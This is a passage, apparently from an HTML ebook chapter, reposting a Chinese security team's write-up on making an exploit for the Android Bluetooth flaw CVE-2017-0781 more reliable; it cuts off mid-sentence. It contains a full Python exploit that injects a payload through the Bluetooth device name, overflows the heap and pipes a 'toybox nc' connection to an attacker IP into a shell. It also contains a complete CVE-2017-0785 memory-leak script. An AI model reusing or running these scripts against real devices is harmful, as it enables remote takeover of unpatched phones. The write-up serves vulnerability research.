@@ -1,0 +1,184 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Android蓝牙远程命令执行漏洞利用实践: Exploit优化</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Android蓝牙远程命令执行漏洞利用实践: Exploit优化</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484386&amp;idx=1&amp;sn=8702a504437612199f49128286668760&amp;chksm=ec6fe4e2db186df48b27b6d8d01ff25e8e6d00ce4d44c87b720fa9ec874f527fcbd597218dad&amp;scene=126&amp;sessionid=1681378740#rd">http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484386&amp;idx=1&amp;sn=8702a504437612199f49128286668760&amp;chksm=ec6fe4e2db186df48b27b6d8d01ff25e8e6d00ce4d44c87b720fa9ec874f527fcbd597218dad&amp;scene=126&amp;sessionid=1681378740#rd</a></blockquote><section class="xmteditor" style="display:none;" data-tools="&#x65B0;&#x5A92;&#x4F53;&#x7BA1;&#x5BB6;" data-label="powered by xmt.cn"/><p style="margin-bottom: 1.2em !important;">Author: Thor@MS509Team</p><p style="margin-bottom: 1.2em !important;">在上一篇文章Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit中，我们介绍了Android的蓝牙远程命令执行漏洞CVE-2017-0781的漏洞利用过程，但是exploit还有些缺点，导致exploit成功率不够高。前段时间armis给出了他们的exploit https://github.com/ArmisSecurity/blueborne，我们赶紧git clone下来学习一波，并结合他们的一些漏洞利用思路，对我们之前的exploit进行了一些优化升级，大大提高了漏洞利用的稳定性和利用成功率。</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">0x00 测试环境</h2><ol style="" class=" list-paddingleft-2"><li><p>Android手机: Nexus 6p</p></li><li><p>Android系统版本: android 7.0 userdebug</p></li><li><p>Ubuntu 16 + USB蓝牙适配器</p></li></ol><p style="margin-bottom: 1.2em !important;">为了调试方便，nexus 6p刷了自己编译的AOSP 7.0 userdebug版本，google官方的release版本经测试也是可以成功利用的。</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">0x01 exploit优化</h2><p style="margin-bottom: 1.2em !important;">我们之前的exploit利用不够稳定主要是因为第一步远程注入payload的时候，我们暂时没有找到稳定的注入方法，只有通过堆喷方式去注入，这就导致payload不能稳定的注入到我们期望的内存地址上。通过研究armis的exploit发现，他们使用了一种比较巧妙的方式注入payload，注入很稳定。armis的方法是将蓝牙适配器的名称改为需要注入的payload，然后再通过蓝牙BNEP协议去连接目标手机，那么目标手机会将请求连接的蓝牙名称缓存到<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btm_cb.acl_db</code>结构体中，而<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btm_cb</code>是bluetooth.default.so中的一个全局变量，存放在内存中bluetooth.default.so的bss段，内存地址是可以根据基址和偏移量计算得到的，因此可以稳定的将payload注入到蓝牙进程的一个相对固定的内存地址。</p><p style="margin-bottom: 1.2em !important;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btm_cb</code>是<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">tBTM_CB</code>结构体类型，其定义部分内容如下：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhWlKwhNmr3HiaCyjY9XRNiaibAHWUJHw0RHg1pECBBjg4NzaS6xlibYVsLQ/0?wx_fmt=png" class="" data-ratio="0.7988668555240793" data-w="1412" data-type="png" src="../Images/6185ca2cce2f558bda31c23d30dbad65.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhWlKwhNmr3HiaCyjY9XRNiaibAHWUJHw0RHg1pECBBjg4NzaS6xlibYVsLQ/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">其中有个<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">tACL_CONN</code>结构体数组，其定义部分内容如下：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhXibqYsBgxREIGnlnI2R4bbqIfpV2HzF8U4gSzlibNbrtQoJ6MjjJZvBA/0?wx_fmt=png" class="" data-ratio="0.804630969609262" data-w="1382" data-type="png" src="../Images/0d21d0c7ff09e395881bca3bfa6ad0fd.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhXibqYsBgxREIGnlnI2R4bbqIfpV2HzF8U4gSzlibNbrtQoJ6MjjJZvBA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">其中的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">remote_name</code>成员变量便是我们注入payload的位置。</p><p style="margin-bottom: 1.2em !important;">注入payload主要用到的函数如下：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">def set_bt_name(payload, src_hci, dst):
+
+    MAX_BT_NAME = 0xf5
+    BNEP_PSM = 15
+
+    # Create raw HCI sock to set our BT name
+    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
+    flt = bt.hci_filter_new()
+    bt.hci_filter_all_ptypes(flt)
+    bt.hci_filter_all_events(flt)
+    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)
+
+    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
+    raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + payload.ljust(MAX_BT_NAME, b'\x00'))
+    raw_sock.close()
+
+    time.sleep(0.1)
+
+    # Connect to BNEP to "refresh" the name (does auth)
+    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+    bnep.connect((dst, BNEP_PSM))
+    bnep.close()
+
+    # Close ACL connection
+    os.system('hcitool dc %s' % (dst,))</code></pre><p style="margin-bottom: 1.2em !important;">其中，payload参数是我们要注入的内容，dst是目标手机的蓝牙MAC地址。</p><p style="margin-bottom: 1.2em !important;">我们将注入的payload设置为：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">payload = struct.pack('&lt;III', 0xaaaa1722, 0x41414141, system_addr) + b'";\n' + b'toybox nc 192.168.2.1 1233 | sh ' + b'\n#'</code></pre><p style="margin-bottom: 1.2em !important;">运行测试注入脚本，我们通过gdb调试可以看到payload成功注入：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIh6FdXzicSfDubJO8gBC8bqZxhiaiaNRRBNkIKbX4k3aibQ9iaRRiciaY4X1xzA/0?wx_fmt=png" class="" data-ratio="0.6754966887417219" data-w="2114" data-type="png" src="../Images/cda11c14c38a40c47f609e648a48242b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIh6FdXzicSfDubJO8gBC8bqZxhiaiaNRRBNkIKbX4k3aibQ9iaRRiciaY4X1xzA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIh4lhRCWXx1iag6GFnywl0U7ic5FZoptMCmmhibKqDKicuM2iaDrglwnWghyQ/0?wx_fmt=png" class="" data-ratio="0.4869831546707504" data-w="1306" data-type="png" src="../Images/7327b9e2c37ac7c0708f13ea7e2304e8.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIh4lhRCWXx1iag6GFnywl0U7ic5FZoptMCmmhibKqDKicuM2iaDrglwnWghyQ/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">这里有个需要注意的地方就是payload不能包含0x00等坏字符，不然会被截断。</p><p style="margin-bottom: 1.2em !important;">现在我们知道可以将payload注入到<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btm_cb.acl_db</code>结构体的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">remote_name</code>变量，且<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btm_cb</code>是放在bluetooth.default.so的bss段，如下所示：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhFGhbraVdACMwWop1QKibKd3zUhZQCcUbsYYxbTIMhpwmPQcM0lkfzFg/0?wx_fmt=png" class="" data-ratio="0.6398852223816356" data-w="1394" data-type="png" src="../Images/a378bbc3774ef85a074aa562cf3466fe.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhFGhbraVdACMwWop1QKibKd3zUhZQCcUbsYYxbTIMhpwmPQcM0lkfzFg/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">因此，我们只要知道了bluetooth.default.so在内存中加载的bss段基址，那么就可以通过基址加偏移量计算得到<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">remote_name</code>变量在内存中的位置，从而知道payload在内存中的位置。bluetooth.default.so在内存中的相关加载基址是可以通过CVE-2017-0785信息泄露漏洞获取到。</p><p style="margin-bottom: 1.2em !important;">我们优化了注入payload的方式之后，exploit的第二步不变，因此可得到优化版本的exploit脚本：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">from pwn import *
+import bluetooth,time,binascii
+from bluetooth import _bluetooth as bt
+
+libc_base = 0xecd3d000
+system_addr = libc_base + 0x64a30 + 1
+
+bluetooth_base_addr = 0xd11e2000
+osi_alloc_addr = bluetooth_base_addr + 0x15b885
+osi_free_addr = bluetooth_base_addr + 0x15b8e5
+
+bluetooth_default_bss_base = 0xd139b000 
+acl_name_addr =  bluetooth_default_bss_base + 0xc2d24
+
+def set_bt_name(payload, src_hci, dst):
+
+    MAX_BT_NAME = 0xf5
+    BNEP_PSM = 15
+
+    # Create raw HCI sock to set our BT name
+    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
+    flt = bt.hci_filter_new()
+    bt.hci_filter_all_ptypes(flt)
+    bt.hci_filter_all_events(flt)
+    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)
+
+    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
+    raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + payload.ljust(MAX_BT_NAME, b'\x00'))
+    raw_sock.close()
+
+    time.sleep(0.1)
+
+    # Connect to BNEP to "refresh" the name (does auth)
+    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+    bnep.connect((dst, BNEP_PSM))
+    bnep.close()
+
+    # Close ACL connection
+    os.system('hcitool dc %s' % (dst,))
+
+def insert_payload(src_hci, target, cmd_str):
+
+    payload = p32(acl_name_addr+0x20)*2 + '\x01\x01\x01\x01' + p32(system_addr) + p32(acl_name_addr+0x14) + p32(osi_alloc_addr) + p32(osi_free_addr)+ '\x01'*8 + p32(acl_name_addr+0x28) + cmd_str + b'\n'*(48-len(cmd_str))
+
+    set_bt_name(payload, src_hci, target)
+
+def heap_overflow(acl_name_addr):
+
+    pkt2 = '\x81\x01\x00'+ p32(acl_name_addr) * 8
+
+    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+
+    sock.connect((target, 0xf))
+
+    for i in range(3000):
+
+        sock.send(pkt2)
+        data = sock.recv(1024)
+
+    sock.close()
+
+if __name__ == "__main__":
+
+     if len(sys.argv) &lt; 4:
+        print 'No argvs specified.'
+        sys.exit()
+     src_hci = sys.argv[1]
+     target = sys.argv[2]
+     reverse_shell_ip = sys.argv[3]
+
+     cmd_str = b"toybox nc %s 1233 | sh "%(reverse_shell_ip) + b"\n#"
+     print "start payload insert  "
+     insert_payload(src_hci, target, cmd_str)
+
+     time.sleep(1)
+
+     print "start heap overflow "
+     heap_overflow(acl_name_addr)</code></pre><p style="margin-bottom: 1.2em !important;">exploit脚本中的那些硬编码的基址是可以通过信息泄露漏洞获取的，而那些硬编码的偏移量则是在libc.so和bluetooth.default.so中找到的，不同机型及系统都需要做适配。<br/>exploit脚本测试第一步是在本地机器上运行监听反弹shell的脚本：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhvjwLBMKsROmN7BwTZddzXdOr8t6JyOBvYibbsib2dC4LJBzPdldy2E6Q/0?wx_fmt=png" class="" data-ratio="0.28842105263157897" data-w="950" data-type="png" src="../Images/d63822b88657237d50341c5fc4e7a696.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhvjwLBMKsROmN7BwTZddzXdOr8t6JyOBvYibbsib2dC4LJBzPdldy2E6Q/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">然后在插上蓝牙适配器的Ubuntu上运行exploit:</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIharrq4diarTY4MliaibkWCsN9Pqz3icnS28LEWStOrVSc22o6R4ceicckTew/0?wx_fmt=png" class="" data-ratio="0.33386837881219905" data-w="1246" data-type="png" src="../Images/e84fd0a263cc8f0109cd9f1f447c1611.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIharrq4diarTY4MliaibkWCsN9Pqz3icnS28LEWStOrVSc22o6R4ceicckTew/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">最后就是静等反弹shell：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhfQBGl01YsSxSfP9dpPDTJ0YHv4PJWCoHb9Lic3NuOu6w3oEafNtATUA/0?wx_fmt=png" class="" data-ratio="0.718078381795196" data-w="1582" data-type="png" src="../Images/bc48b9b7afc2c9ee8ef67227688df8d4.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhfQBGl01YsSxSfP9dpPDTJ0YHv4PJWCoHb9Lic3NuOu6w3oEafNtATUA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">经过优化后，我们的exploit一般运行1~3次便能成功执行，nice!</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">0x02 关于CVE-2017-0785信息泄露</h2><p style="margin-bottom: 1.2em !important;">CVE-2017-0785信息泄露漏洞网上分析有很多了，armis的exploit中也有给出他们的信息泄露脚本，这里我也把我们组@heeeeen大牛编写的脚本放出来：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">from pwn import *
+import bluetooth
+
+pthread_start_off = 0x66a6d
+sdp_conn_timer_timeout_off = 0x136350
+
+def packet_leak(service, continuation_state):
+
+    pkt = '\x02\x00\x00'
+    pkt += p16(7 + len(continuation_state))
+    pkt += '\x35\x03\x19'
+    pkt += p16(service)
+    pkt += '\x01\x00'
+    pkt += continuation_state
+    return pkt
+
+def info_leak(target):
+
+    service_long = 0x0100
+    service_short = 0x0001
+    mtu = 50
+    n = 30
+
+    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+    bluetooth.set_l2cap_mtu(sock, mtu)
+    context.endian = 'big'
+
+    sock.connect((target, 1))
+
+    sock.send(packet_leak(service_long, '\x00'))
+    data = sock.recv(mtu)
+
+    if data[-3] != '\x02':
+        log.error('Invalid continuation state received.')
+
+    stack = ''
+
+    for i in range(1, n):
+
+        sock.send(packet_leak(service_short, data[-3:]))
+        data = sock.recv(mtu)
+        stack += data[9:-3]
+    sock.close()
+
+    pthread_start_func = int(stack[0x0184:0x0188].encode('hex'),16) 
+
+    libc_base = pthread_start_func  -  pthread_start_off
+    print "libc.so base address is %s" % hex(libc_base)
+
+    sdp_conn_timer_timeout_func = int(stack[0x0170:0x0174].encode('hex'),16) 
+
+    bluetooth_base_addr = sdp_conn_timer_timeout_func - sdp_conn_timer_timeout_off - 1
+
+    print "bluetooth.default.so base address is %s" % hex(bluetooth_base_addr)
+
+    return (libc_base, bluetooth_base_addr)
+
+if __name__ == "__main__":
+
+       if len(sys.argv) &lt; 2:
+          print 'No argvs specified.'
+          sys.exit()
+
+       target = sys.argv[1]
+
+       info_leak(target)</code></pre><p style="margin-bottom: 1.2em !important;">该脚本主要利用的是泄露的libc.so中<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">pthread_start</code>函数地址找到libc.so的加载基址，利用泄露的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">sdp_conn_timer_timeout</code>函数地址找到bluetooth.default.so加载基址。需要说明的是，不同机型及系统还是要根据泄露的内容及具体的偏移量修改脚本才行，需要做适配。</p><p style="margin-bottom: 1.2em !important;">运行结果如下所示：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhMOa9YibuGj5WQRySicgkLrUxqagP0gw8ujkKL7Ww80gZcqPMRgHMONTw/0?wx_fmt=png" class="" data-ratio="0.3996101364522417" data-w="1026" data-type="png" src="../Images/2eca7c8d907e9783b8767335b08ada7f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhMOa9YibuGj5WQRySicgkLrUxqagP0gw8ujkKL7Ww80gZcqPMRgHMONTw/0?wx_fmt=png"/></p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">0x03 关于armis exploit的大致分析</h2><p style="margin-bottom: 1.2em !important;">armis官方给出的exploit主要有两个步骤，第一步是注入payload，第二步则是通过堆溢出去覆盖堆上的某些数据结构的函数指针，从而劫持进程执行。前面我们已经介绍了armis
+ exploit注入payload的方法，现在我们主要介绍下他们劫持进程的思路。我们知道通过<br/>CVE-2017-0781的堆溢出可以去覆盖堆上任意结构体的前8个字节，而armis选择了直接溢出只有8个字节大小的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">list_node_t</code>结构体，其定义如下：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhsiabxShAmdsIMPD10xfFqFw8zPHdib4QlEvWCBu4KEsgS645speh0L3w/0?wx_fmt=png" class="" data-ratio="0.2593516209476309" data-w="802" data-type="png" src="../Images/b25d8b574985e3aafd06ebe654029c4c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhsiabxShAmdsIMPD10xfFqFw8zPHdib4QlEvWCBu4KEsgS645speh0L3w/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">该结构体的第二个成员是个void型指针，可以根据用途转化为其他类型的指针，而恰好在<br/><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btu_hci_msg_process</code>函数中会将<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">list_node_t</code>结构体的data成员强制转化为<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">post_to_task_hack_t</code>结构体类型，如下所示：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhEdIzuEcNOjHDucZicLpAhCn2pxyv4kFfjibFCtJs51DArrqrWDrqlIGA/0?wx_fmt=png" class="" data-ratio="0.4444444444444444" data-w="1440" data-type="png" src="../Images/8bf92ddca6be78d172af9df8ef4226ce.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhEdIzuEcNOjHDucZicLpAhCn2pxyv4kFfjibFCtJs51DArrqrWDrqlIGA/0?wx_fmt=png"/><br/>而<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">post_to_task_hack_t</code>则包含的是一个函数指针：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhFvo7icibXSn4WUyuUauqviaaD5xdmxG5eDGwWNTUYdXM5GwS2j83mjDbw/0?wx_fmt=png" class="" data-ratio="0.14790575916230367" data-w="1528" data-type="png" src="../Images/b262198ba4af1289a54f259a04cb9188.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhFvo7icibXSn4WUyuUauqviaaD5xdmxG5eDGwWNTUYdXM5GwS2j83mjDbw/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">因此，armis的exploit通过溢出<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">list_node_t</code>结构体可以直接控制堆上的函数指针，从而达到劫持进程执行的目的。<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">list_node_t</code>结构体到<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">p_msg</code>参数的转换则是在<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btu_hci_msg_ready</code>函数中进行的，如下所示：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhY3sCTrhRCWwicRzz3Iz3nCbPFMtT1ibjqEiaz2M5GvXRwyGmGw9Uqc3WA/0?wx_fmt=png" class="" data-ratio="0.13342696629213482" data-w="1424" data-type="png" src="../Images/811e353d67906d95e25e33968846676b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhY3sCTrhRCWwicRzz3Iz3nCbPFMtT1ibjqEiaz2M5GvXRwyGmGw9Uqc3WA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">fixed_queue_dequeue</code>函数从队列中出队一个<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 